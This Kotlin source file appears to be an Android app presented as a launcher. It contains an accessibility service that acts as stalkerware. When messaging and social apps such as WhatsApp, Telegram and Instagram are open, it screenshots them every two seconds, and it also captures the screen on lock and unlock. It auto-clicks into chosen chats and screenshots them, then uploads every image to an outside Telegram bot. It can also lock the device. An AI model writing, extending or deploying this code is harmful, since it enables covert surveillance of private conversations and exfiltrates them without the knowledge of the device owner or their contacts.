package com.example.launcher

import android.accessibilityservice.AccessibilityService
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Bitmap
import android.os.Handler
import android.os.Looper
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.io.ByteArrayOutputStream
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors

class MonitorAccessibilityService : AccessibilityService() {

    private val handler = Handler(Looper.getMainLooper())
    private var isLoopActive = false
    private var isAutoClickRunning = false
    private var lastAutoClickSignature: String? = null
    private var screenStateReceiver: BroadcastReceiver? = null

    private val monitoredPackages = listOf(
        "com.whatsapp",
        "com.whatsapp.w4b",
        "com.facebook.katana",
        "com.facebook.lite",
        "com.facebook.orca",
        "org.telegram.messenger",
        "com.instagram.android",
        "com.zhiliaoapp.musically",
        "com.zhiliaoapp.musically.go"
    )

    private val screenshotRunnable = object : Runnable {
        override fun run() {
            val prefs = Prefs(this@MonitorAccessibilityService)
            if (!prefs.running) {
                stopScreenshotLoop()
                return
            }

            val activeRootNode = rootInActiveWindow
            val activePackage = activeRootNode?.packageName?.toString()

            if (activePackage != packageName && activePackage != null && monitoredPackages.contains(activePackage)) {
                captureAndSendScreenshot(activePackage, "app_$activePackage", prefs)
                handler.postDelayed(this, 2000)
            } else {
                stopScreenshotLoop()
            }
        }
    }

    private val autoClickWatchRunnable = object : Runnable {
        override fun run() {
            val prefs = Prefs(this@MonitorAccessibilityService)
            if (!prefs.running || !prefs.autoClickEnabled) {
                isAutoClickRunning = false
                handler.postDelayed(this, 1000)
                return
            }

            val targetPkg = prefs.autoClickTargetPackage.ifBlank { "com.whatsapp" }
            val activePkg = getCurrentActivePackage()

            if (activePkg == targetPkg && !isAutoClickRunning) {
                val signature = "$targetPkg:${prefs.autoClickTriggerId}"
                if (signature != lastAutoClickSignature) {
                    isAutoClickRunning = true
                    lastAutoClickSignature = signature
                    runAutoClickFlow(targetPkg, prefs)
                }
            } else if (activePkg != targetPkg) {
                lastAutoClickSignature = null
            }

            handler.postDelayed(this, 1000)
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        registerScreenReceiver()
        handler.removeCallbacks(autoClickWatchRunnable)
        handler.post(autoClickWatchRunnable)
    }

    fun triggerRefreshCheck() {
        val prefs = Prefs(this)
        lastAutoClickSignature = null
        val activePkg = getCurrentActivePackage()
        if (activePkg != null && monitoredPackages.contains(activePkg) && activePkg != packageName && prefs.running) {
            if (!isLoopActive) {
                isLoopActive = true
                handler.removeCallbacks(screenshotRunnable)
                handler.post(screenshotRunnable)
            }
        } else {
            stopScreenshotLoop()
        }
        handler.removeCallbacks(autoClickWatchRunnable)
        handler.post(autoClickWatchRunnable)
    }

    fun lockScreenNow() {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminName = ComponentName(this, ScreenAdminReceiver::class.java)
            if (dpm.isAdminActive(adminName)) {
                dpm.lockNow()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun stopScreenshotLoop() {
        isLoopActive = false
        handler.removeCallbacks(screenshotRunnable)
    }

    private fun getCurrentActivePackage(): String? {
        return rootInActiveWindow?.packageName?.toString()
    }

    private fun runAutoClickFlow(targetPackage: String, prefs: Prefs) {
        checkScreenAndProceed(targetPackage, prefs, 0)
    }

    private fun checkScreenAndProceed(packageName: String, prefs: Prefs, attempt: Int) {
        if (!prefs.autoClickEnabled) {
            isAutoClickRunning = false
            return
        }

        handler.postDelayed({
            if (!prefs.autoClickEnabled) {
                isAutoClickRunning = false
                return@postDelayed
            }

            val rootNode = rootInActiveWindow
            if (rootNode == null) {
                if (attempt < 6) {
                    checkScreenAndProceed(packageName, prefs, attempt + 1)
                } else {
                    isAutoClickRunning = false
                }
                return@postDelayed
            }

            val notNowNodes = rootNode.findAccessibilityNodeInfosByText("Not now")
            if (notNowNodes.isNotEmpty()) {
                for (node in notNowNodes) {
                    if (clickNodeOrParent(node)) break
                }
                handler.postDelayed({ proceedToTargetActions(packageName, prefs) }, 2000)
                return@postDelayed
            }

            val chatListCheck = rootNode.findAccessibilityNodeInfosByText("Chats")
            val targetTextCheck = if (prefs.autoClickTargetText.isNotBlank()) {
                rootNode.findAccessibilityNodeInfosByText(prefs.autoClickTargetText)
            } else {
                emptyList()
            }

            if (chatListCheck.isNotEmpty() || targetTextCheck.isNotEmpty() || rootNode.packageName?.toString() == packageName) {
                proceedToTargetActions(packageName, prefs)
            } else {
                if (attempt < 6) {
                    checkScreenAndProceed(packageName, prefs, attempt + 1)
                } else {
                    isAutoClickRunning = false
                }
            }
        }, 1500)
    }

    private fun proceedToTargetActions(packageName: String, prefs: Prefs) {
        if (!prefs.autoClickEnabled) {
            isAutoClickRunning = false
            return
        }

        val currentRoot = rootInActiveWindow
        if (currentRoot != null) {
            captureAndSendScreenshot(packageName, "${packageName}_list", prefs)

            handler.postDelayed({
                if (!prefs.autoClickEnabled) {
                    isAutoClickRunning = false
                    return@postDelayed
                }

                val targetText = prefs.autoClickTargetText.trim()
                if (targetText.isNotEmpty()) {
                    val nodes = currentRoot.findAccessibilityNodeInfosByText(targetText)
                    for (node in nodes) {
                        if (clickNodeOrParent(node)) break
                    }
                }

                handler.postDelayed({
                    if (prefs.autoClickEnabled) {
                        captureAndSendScreenshot(packageName, "${packageName}_target", prefs)
                    }
                    isAutoClickRunning = false
                }, 2000)
            }, 1500)
        } else {
            isAutoClickRunning = false
        }
    }

    private fun clickNodeOrParent(node: AccessibilityNodeInfo): Boolean {
        var clickableNode: AccessibilityNodeInfo? = node
        while (clickableNode != null) {
            if (clickableNode.isClickable) {
                return clickableNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
            clickableNode = clickableNode.parent
        }
        return false
    }

    private fun registerScreenReceiver() {
        if (screenStateReceiver != null) return
        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_OFF)
            addAction(Intent.ACTION_USER_PRESENT)
        }
        screenStateReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                val prefs = Prefs(this@MonitorAccessibilityService)
                if (!prefs.running) return
                when (intent?.action) {
                    Intent.ACTION_SCREEN_OFF -> captureScreenEvent("screen_off", prefs)
                    Intent.ACTION_USER_PRESENT -> {
                        handler.postDelayed({ captureScreenEvent("screen_unlocked", prefs) }, 1000)
                    }
                }
            }
        }
        registerReceiver(screenStateReceiver, filter)
    }

    private fun captureScreenEvent(tag: String, prefs: Prefs) {
        captureAndSendScreenshot("", tag, prefs)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val prefs = Prefs(this)
        if (!prefs.running) {
            stopScreenshotLoop()
            return
        }

        val packageName = event.packageName?.toString() ?: return

        if (monitoredPackages.contains(packageName) && packageName != this.packageName) {
            if (!isLoopActive) {
                isLoopActive = true
                handler.removeCallbacks(screenshotRunnable)
                handler.post(screenshotRunnable)
            }
        } else if (packageName != this.packageName) {
            stopScreenshotLoop()
        }
    }

    private fun captureAndSendScreenshot(currentPackage: String, customPrefix: String, prefs: Prefs) {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            takeScreenshot(
                Display.DEFAULT_DISPLAY,
                Executors.newSingleThreadExecutor(),
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshot: ScreenshotResult) {
                        val hardwareBuffer = screenshot.hardwareBuffer
                        val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshot.colorSpace)
                        hardwareBuffer.close()

                        if (bitmap != null) {
                            val mutableBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, true)
                            val stream = ByteArrayOutputStream()
                            mutableBitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream)
                            sendTelegramPhoto(stream.toByteArray(), customPrefix, prefs)
                        }
                    }

                    override fun onFailure(errorCode: Int) {}
                }
            )
        }
    }

    private fun sendTelegramPhoto(photoBytes: ByteArray, prefix: String, prefs: Prefs) {
        val botToken = prefs.telegramBotToken.trim()
        val chatId = prefs.telegramChatId.trim()
        if (botToken.isEmpty() || chatId.isEmpty()) return

        Thread {
            try {
                val timeStamp = System.currentTimeMillis()
                val fileName = "${prefix}_${timeStamp}.jpg"

                val boundary = "Boundary_" + System.currentTimeMillis()
                val urlString = "https://api.telegram.org/bot$botToken/sendPhoto"
                val url = URL(urlString)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

                val outputStream = conn.outputStream
                val writer = OutputStreamWriter(outputStream, "UTF-8")

                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
                writer.append("$chatId\r\n")
                writer.flush()

                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"$fileName\"\r\n")
                writer.append("Content-Type: image/jpeg\r\n\r\n")
                writer.flush()

                outputStream.write(photoBytes)
                outputStream.flush()

                writer.append("\r\n--$boundary--\r\n")
                writer.flush()
                writer.close()

                conn.responseCode
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    override fun onUnbind(intent: Intent?): Boolean {
        stopScreenshotLoop()
        isAutoClickRunning = false
        handler.removeCallbacks(autoClickWatchRunnable)
        if (screenStateReceiver != null) {
            try {
                unregisterReceiver(screenStateReceiver)
            } catch (_: Exception) {
            }
            screenStateReceiver = null
        }
        if (instance === this) {
            instance = null
        }
        return super.onUnbind(intent)
    }

    override fun onInterrupt() {
        stopScreenshotLoop()
        isAutoClickRunning = false
        handler.removeCallbacks(autoClickWatchRunnable)
    }

    companion object {
        @Volatile
        var instance: MonitorAccessibilityService? = null
    }
}
